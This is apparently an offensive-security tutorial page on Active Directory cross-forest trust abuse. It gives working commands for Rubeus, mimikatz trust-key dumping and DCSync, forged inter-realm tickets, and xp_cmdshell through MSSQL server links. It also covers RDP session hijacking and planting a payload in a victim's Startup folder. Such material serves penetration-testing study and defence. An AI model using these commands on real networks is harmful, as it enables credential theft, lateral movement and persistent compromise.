---
title: Cross Forest Attacks
category: Active Directory
order: 6
---

In this section we are going to abuse trusts between forests.

# One-Way (Inbound)

When a trust is inbound in our perspective, it means that principals in our domain can be granted access to resources in the foreign domain.

* PowerView (dev):

```powershell
Get-DomainComputer -Domain external.local -Properties DNSHostName
```
* BloodHound:

```
.\SharpHound.exe -c DcOnly -d external.local
```

We can enuemrate also groups that contains users outside of its domain.

* PowerView (dev):

```powershell
Get-DomainForeignGroupMember -Domain external.local 
```
The `MemberName` field contains a SID that can be resolved in our current domain with:

```powershell
ConvertFrom-SID  S-1-5-21-3263068140-2042693922-2891547269-1132
```

To hop a domain trust using Kerberos, we first need an inter-realm Key. We need a TGT for the target user.

```
.\Rubeus.exe asktgt /user:admin /domain:corp.local /aes256:<aes256> /nowrap
```

Then, we can use the TGT to request a referral ticket form the current domain to the target domain.

```
.\Rubeus.exe asktgs /service:krbtgt/target-domain.com /domain:corp.local /dc:dc01.corp.local /ticket:<base64-ticket> /nowrap
```

> **Note**: The inter-realm ticket is `rc4_hmac` even if we created the TGT with `aes256_cts_hmac_sha1`. This is a default configuration unless AES has ben specifically configured on the trust.

Finally we an use this inter-realm ticket to request a TGS.

```
.\Rubeus.exe asktgs /service:cifs/dc.target-domain.com /domain:target-domain.com /dc:dc.target-domain.com /ticket:<base64-inter-realm> /nowrap
```


# One-Way (Outbound)

If Domain A (Me) trusts Domain B, users in Domain B can access resources in Domain A but users in Domain A should not be able to access resources in Domain B. But there are some circumstances in which we can slide under the radar. An example of this includes SQL Server Links.

```
Get-DomainTrust -Domain corp.local
```

## Trusted Domain Object (TDO) user

But, we can still partially exploit this trus and obtain a "Domain User" of the trust abusing the Trusted Domain Object (TDO). Both domains in a trust relationship store a shared password which is automatically changed every 30 days. These objects are stored in the system contained and can be read via LDAP.

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain corp.local --attributes distinguishedName,name,flatName,trustDirection
```

### Retrieving the Trusted Key

There are two ways:

* Moving laterally to the DC and dump the key from memory.

```
beacon> mimikatz lsadump::trust /patch
```

> **Note**: Memory patching is very risky, particularly on domain controllers.

* Using DCSync with the TDO GUID.

```powershell
Get-DomainObject -Identity "CN=target-domain.com,CN=System,DC=corp,DC=local" | select objectGuid
```

```
beacon> mimikatz @lsadump::dcsync /domain:corp.local /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}
```

`[Out]` and `[Out-1]` are the "new" and "old" passwords respectively.  In most cases, the current `[Out]` key is the one you want. 

### Creating a TGT

In addition, there is also a "trust account" which is created in the "trusted" domain, with the name of the "trusting" domain.  For instance, if we get all the user accounts in the DEV domain, we'll see CYBER$ and STUDIO$, which are the trust accounts for those respective domain trusts.

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"

[*] TOTAL NUMBER OF SEARCH RESULTS: 11

        [...]
	[+] cn : CORP$
	[+] cn : TARGET$
```

This meand TARGET domain will have a trust account called `CORP$`. This is the account we must impersonate to request Kerberos tickets across the trust.

```
.\Rubeus.exe asktgt /user:CORP$ /domain:target-domain.com /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap
```

> **Note**: RC4 tickets are used by default across trusts.

## Trust Abuse with MSSQL Server

MSSQL Servers are generally deployed in plenty windows domain. SQL Servers provide very good options for lateral movement as domain users can be mapped to dabase roles.

A fantastic tool to abuse MSSQL is `PowerUpSQLl`: 

* [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
```powershell
Import-Module .\PowerUpSQL.psd1
```

> **Note**: Important! Write `Import-Module` and import which have **PSD1** extension.

We can discover SQL servers:

```powershell
Get-SQLInstanceDomain
```

We can check accessibility:

```powershell
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```
Gather information:

```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

### Database Links

A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of databases links between Microsoft SQL Servers, it is possible to execute stored procedures which means RCE.

Database link works even across forest trusts.

```powershell
Get-SQLServerLink -Instance mssql.corp.local -Verbose
```

So we can execute queries on the remote Server Link, see if this server has others links and above, instead of doing it manually that will be explained in a note, exists a script that crawls all the mssql server links.

```powershell
Get-SQLServerLinkCrawl -Instance mssql.corp.local -Verbose
```

> **Note**: Manual way:
>
> See if has a server link:
> `select * from master..sysservers`
>
> Openquery() function can be used to run quieries on a linked database:
> `select * from openquery("CORP-SQL1", 'select * from master..sysservers')`
>
> `select * from openquery("CORP-SQL1", ''select * from openquery("CORP-SQL2", 'master..sysservers'')')`

To execute commands from MSSQL server we need to use `xp_cmdshell`. If `rpcout` is enabled `xp_cmdshell` can be enabled using:

```
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "other-sql"
```

And finally:

```powershell
Get-SQLServerLinkCrawl -Instance mssql.corp.local -Query "exec master..xp_cmdshell 'whoami'"
```

## RDPInception

Another way is via RDP drive sharing (**RDPInception**). When a user enables drive sharing for their RDP sessions, it creates a mount-point on the target machine that maps back to their local machine. If the target machine is compromised, we may migrate into RDP users's session and use this mount-point to write files directly onto their machine. Useful for dropping payloads into their startup folder which would be executed the next time they logon.

The strategy is to find principals in our current domain that are not native to that domain, but are from `external.local`.

* PowerView (dev):

```
Get-DomainForeignGroupMember -Domain corp.local
```

> **Note**: We can not convert the SID with `ConvertFrom-SID` since we don't have access to the other Domain.

A nice methodology is to enumerate the current domain and find instances where members of the foreign domain, have privileged access (local admin, RDP, WinRM, DCOM access), move laterally to those machines, and camp there until you see a member authenticate. Then, impersonate them to hop the trust.

`Get-DomainGPOUserLocalGroupMapping` and `Find-DomainLocalGroupMember` can work for that task:

* PowerView (dev):

```
Get-DomainGPOUserLocalGroupMapping  -Identity "Jump Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName
```
Once the foreign user logs on one of our compromised computers, we can hijack his RDP session. Example above from Cobalt Strike.

```
beacon> ps

 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 2365  1012  rdpclip.exe                  x64   3           EXT\j.doe
```

```
beacon> inject 2365 x64 tcp-local
[+] established link to child beacon: 10.10.10.10
```

Now at that moment we can do import PowerView and enumerate the domain, because we simply hijacked and existing authenticated session and we are inside a valid `external.local` domain.


Inside the user RDP session if `Drive Sharing` is enabled a **UNC tsclient** has a mount point for every drive that is being shared over RDP.

`\\tsclient\C` is the `C:\` drive of the origin machine of the RDP session, so we can upload a bat or exe to the users startup folder.

```
beacon> cd \\tsclient\c\Users\j.doe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload payload.exe
```


# Across Forests using Trust Tickets

First we need to retrieved the Trust Key:

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
```

> **Note**: The access we will have will be limited to what our DA account is configured to have on the other Forest!

An **inter-realm TGT** can be forged:

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /rc4:cd3fb1b0b49c7a56d285fffdd1399231 /service:krbtgt /target:extcorp.local /ticket:C:\temp\trust_forest_tkt.kirbi"'
```
* **Invoke-Mimikatz**

|                   **Parameter**                   |                 **Description**                |
|:-------------------------------------------------:|:----------------------------------------------:|
| /domain:sub.corp.local                            | Current Domain FQDN                            |
| /sid:S-1-5-21-268341927-4156873456-1784235843     | Current Domain SID                             |
| /user:Administrator                               | User to impersonate                            |
| /rc4:a9b30e5b0dc865eadcea9411e4ade72d             | krbtgt hash of Current Domain                  |
| /service:krbtgt                                   | krbtgt service to abuse                        |
| /target:extcorp.local                             | Target domain                                  |
| /tiket:C:\Windows\Temp\trust_tkt.kirbi            | File to store the ticket                       |



Now we can request a TGS for `cifs` service on the dc of the trusted forest.

* Asktgs.exe (kekeo_old)

```powershell
.\asktgs.exe c:\temp\trust_forest_tkt.kirbi CIFS/dc01.extcorp.local
```

* Rubeus.exe
```powershell
.\Rubeus.exe asktgs /ticket:trust_forest_tkt.kirbi /dc:dc01.extcorp.local /service:CIFS/dc01.extcorp.local
```

And inject the ticket on the current session:

```powershell
.\kirbikator.exe lsa .\CIFS.dc01.extcorp.local.kirbi
```
> **Note**: We can not list all the file system of other forest. We can only list shared folders.

```
ls \\dc01.extcorp.local\share\
```
